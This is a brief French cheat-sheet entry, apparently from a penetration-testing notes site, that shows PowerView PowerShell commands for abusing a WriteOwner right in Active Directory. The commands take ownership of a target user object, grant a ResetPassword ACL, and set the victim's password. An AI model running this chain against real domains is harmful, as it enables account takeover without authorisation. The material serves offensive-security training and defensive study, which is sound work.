---
public: true # set to true to make the article publishable
---

```powershell
# Récupération du SID d'un utilisateur
. .\PowerView.ps1
$targetUser = "tom"
$sid = Convert-NameToSid $targetUser # Powerview
$sid = (Get-ADUser "wley").SID.Value # module Active Directory
```

## Exemples 

```powershell title="Réinitialisation du mot de passe AD via appropriation de l'objet utilisateur cible"

# Appropriation d'un utilisateur (lorsqu'on a un droit WriteOwner référencé dans Bloodhound)
Set-DomainObjectOwner -Identity $targetUser -OwnerIdentity source_user
# Ajout d'une ACL sur le compte approprié pour réinitialiser le password :
Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -Rights ResetPassword

# Réinitialisation du password
$pass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
Set-DomainUserPassword -Identity Target_AD_User -Password $pass
```

```
#
```